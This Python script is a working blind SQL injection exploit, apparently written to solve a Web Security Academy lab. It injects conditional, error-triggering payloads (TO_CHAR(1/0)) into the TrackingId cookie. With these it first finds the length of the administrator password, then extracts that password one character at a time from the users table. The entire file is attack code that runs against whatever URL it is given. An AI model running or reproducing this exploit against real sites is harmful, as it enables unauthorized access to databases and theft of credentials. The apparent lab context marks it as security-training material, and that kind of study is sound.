#!/usr/bin/python3
import string
import requests
import sys


def send_blind_sqli(payload, cookies, url):
    tmp_cookies = cookies.copy()
    tmp_cookies["TrackingId"] += payload
    if not "Internal Server Error" in requests.get(url=url, cookies=tmp_cookies).text:
        return True


def pw_take(url, cookies, length):
    pw = ''
    pos = 1
    charset = string.digits + string.ascii_lowercase
    while pos <= length:
        for char in charset:
            payload = f"'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN '' ELSE TO_CHAR(1/0) END FROM users WHERE username='administrator')||'"
            print(f"[-] Password = {pw + char}", flush=True, end="\r")
            if send_blind_sqli(payload, cookies, url):
                pw += char
                pos += 1
                break
    print(f"[+] Password = {pw}", flush=True)
    return pw


def pw_length(url, cookies):
    for i in range(19, 50):
        payload = f"'||(SELECT CASE WHEN LENGTH(password)>{i} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        print(f"[-] Testing Password length = {i}", flush=True, end="\r")
        if send_blind_sqli(payload, cookies, url):
            print(f"[+] Password length is = {i}       ", flush=True)
            return i
            break


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} http://web-security-academy.net/")
        sys.exit(-1)
    print("".center(50,"-"))
    print("[*]" + "Web-Security-Academy Blind-Sql-Injection".center(47))
    print("[*]" + "Conditional SQLi".center(47))
    print("".center(50, "-"))
    cookies = requests.session().get(url).cookies.get_dict()
    length = pw_length(url, cookies)
    print("[+] Getting the Password")
    pw = pw_take(url, cookies, length)